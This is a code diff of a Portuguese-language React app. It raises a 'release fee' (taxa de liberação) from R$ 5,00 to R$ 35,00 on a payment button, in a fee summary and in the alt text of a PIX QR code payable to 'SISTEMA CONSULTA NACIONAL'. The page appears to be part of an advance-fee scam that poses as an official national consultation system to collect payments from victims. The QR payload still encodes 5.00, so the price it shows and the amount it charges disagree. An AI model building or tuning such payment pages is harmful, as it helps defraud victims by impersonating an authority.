@@ -705,7 +705,7 @@ export default function App() {
             onClick={() => setView('network_fee')}
             className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all shadow-lg active:scale-[0.99] cursor-pointer"
           >
-            PAGAR TAXA DE LIBERAÇÃO (R$ 5,00)
+            PAGAR TAXA DE LIBERAÇÃO (R$ 35,00)
           </button>
           <button 
             type="button"
@@ -805,7 +805,7 @@ export default function App() {
             </div>
             <div className="flex justify-between items-center text-xs">
               <span className="text-neutral-400">Taxa de Liquidação e Liberação</span>
-              <span className="text-emerald-400 font-mono font-bold text-base">R$ 5,00</span>
+              <span className="text-emerald-400 font-mono font-bold text-base">R$ 35,00</span>
             </div>
             <div className="flex justify-between items-center text-xs pt-2 border-t border-neutral-800/80">
               <span className="text-neutral-400 flex items-center gap-1.5">
@@ -820,7 +820,7 @@ export default function App() {
               <div className="p-3 bg-white rounded-xl shadow-inner">
                 <img 
                   src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=00020126580014br.gov.bcb.pix0136e92b3a01-b841-45f8-8a89-consulta052040000530398654055.005802BR5920SISTEMA%20CONSULTA%20NACIONAL6009SAO%20PAULO62070503***6304A8F2" 
-                  alt="QR Code PIX R$ 5,00"
+                  alt="QR Code PIX R$ 35,00"
                   className="w-36 h-36"
                   referrerPolicy="no-referrer"
                 />
